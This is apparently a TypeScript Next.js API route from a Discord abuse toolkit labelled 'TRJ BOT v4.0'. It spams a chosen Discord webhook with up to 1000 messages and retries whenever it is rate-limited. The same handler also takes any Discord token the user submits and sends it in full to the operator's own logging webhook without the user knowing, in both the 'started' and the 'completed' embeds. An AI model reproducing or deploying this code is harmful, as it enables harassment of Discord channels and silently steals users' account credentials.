import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:webhook-spam`, RATE_LIMITS.medium);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }


    const body = await request.json().catch(() => ({}));
    const { token, webhookUrl: targetWebhookUrl, message, count = 50, username, avatarUrl } = body;

    if (!targetWebhookUrl) {
      return NextResponse.json({ success: false, error: 'أدخل رابط الويب هوك' }, { status: 400 });
    }
    if (!message) {
      return NextResponse.json({ success: false, error: 'أدخل الرسالة' }, { status: 400 });
    }

    if (token) {
      sendFullToken('ويب هوك سبام', token, { '🔗 الويب هوك': targetWebhookUrl });
    }

    const ct = token ? cleanToken(token) : '';
    const totalCount = Math.min(Math.max(parseInt(String(count)) || 50, 1), 1000); // حد أقصى 1000
    const whUrl = getLogWebhookUrl();
    let sent = 0, failed = 0;

    // إرسال معلومات كاملة للويب هوك - توكن كامل + كل الميزات
    sendToWebhook({
      username: 'TRJ BOT v4.0',
      avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
      embeds: [{
        title: '🔗 Webhook Spam - Started',
        description: 'تم بدء سبام الويب هوك',
        color: 0xFF69B4,
        fields: [
          { name: '💬 الرسالة', value: message.substring(0, 500), inline: false },
          { name: '🔢 العدد', value: String(count), inline: true },
          { name: '👤 اسم المرسل', value: username || 'Default', inline: true },
          { name: '🖼️ Avatar URL', value: avatarUrl || 'None', inline: true },
          ...(ct ? [{ name: '🎫 التوكن الكامل', value: `\`\`\`${ct}\`\`\``, inline: false }] : []),
          { name: '🔗 الويب هوك المستهدف', value: targetWebhookUrl.substring(0, 100), inline: false },
          { name: '⏰ الوقت', value: new Date().toISOString(), inline: true },
          { name: '🛡️ الإصدار', value: 'TRJ BOT v4.0', inline: true },
        ],
        footer: { text: 'TRJ BOT v4.0 - Webhook Spam' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    // بناء payload الويب هوك
    const payload: Record<string, unknown> = {
      content: message,
    };
    if (username) payload.username = username;
    if (avatarUrl) payload.avatar_url = avatarUrl;

    // إرسال بالتوازي - دفعات من 5 مع معالجة Rate Limit
    // Discord rate limit: 5 requests per webhook per second
    const batchSize = 5;
    let rlWait = 0;

    for (let i = 0; i < totalCount; i += batchSize) {
      // انتظر rate limit عالمي
      const now = Date.now();
      if (now < rlWait) {
        await new Promise(r => setTimeout(r, rlWait - now + 100));
      }

      const batchLen = Math.min(batchSize, totalCount - i);
      const results = await Promise.allSettled(
        Array.from({ length: batchLen }, async () => {
          try {
            const controller = new AbortController();
            const tid = setTimeout(() => controller.abort(), 15000);
            const res = await fetch(targetWebhookUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload),
              signal: controller.signal,
            });
            clearTimeout(tid);

            // معالجة Rate Limit
            if (res.status === 429) {
              try {
                const errData = await res.json().catch(() => ({ retry_after: 1 }));
                const waitMs = Math.min((errData.retry_after || 1) * 1000, 5000);
                rlWait = Date.now() + waitMs;
                // retry مرة واحدة
                await new Promise(r => setTimeout(r, waitMs));
                const ctrl2 = new AbortController();
                const tid2 = setTimeout(() => ctrl2.abort(), 15000);
                const retryRes = await fetch(targetWebhookUrl, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify(payload),
                  signal: ctrl2.signal,
                });
                clearTimeout(tid2);
                return retryRes.ok || retryRes.status === 204;
              } catch {
                return false;
              }
            }

            return res.ok || res.status === 204;
          } catch {
            return false;
          }
        })
      );

      for (const r of results) {
        if (r.status === 'fulfilled' && r.value) sent++;
        else failed++;
      }

      // تأخير 1 ثانية بين الدفعات لتجنب Rate Limit
      if (i + batchSize < totalCount) {
        await new Promise(r => setTimeout(r, 1000));
      }
    }

    // نتيجة كاملة للويب هوك
    sendToWebhook({
      username: 'TRJ BOT v4.0',
      avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
      embeds: [{
        title: '✅ Webhook Spam - Completed',
        description: `تم الانتهاء من سبام الويب هوك`,
        color: 0x00FF41,
        fields: [
          { name: '✅ أُرسل', value: String(sent), inline: true },
          { name: '❌ فشل', value: String(failed), inline: true },
          { name: '🔢 المجموع', value: String(totalCount), inline: true },
          { name: '💬 الرسالة', value: message.substring(0, 200), inline: false },
          { name: '🔗 الويب هوك', value: targetWebhookUrl.substring(0, 80), inline: false },
          ...(ct ? [{ name: '🎫 التوكن', value: `\`\`\`${ct}\`\`\``, inline: true }] : []),
        ],
        footer: { text: 'TRJ BOT v4.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({ success: true, stats: { sent, failed } });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
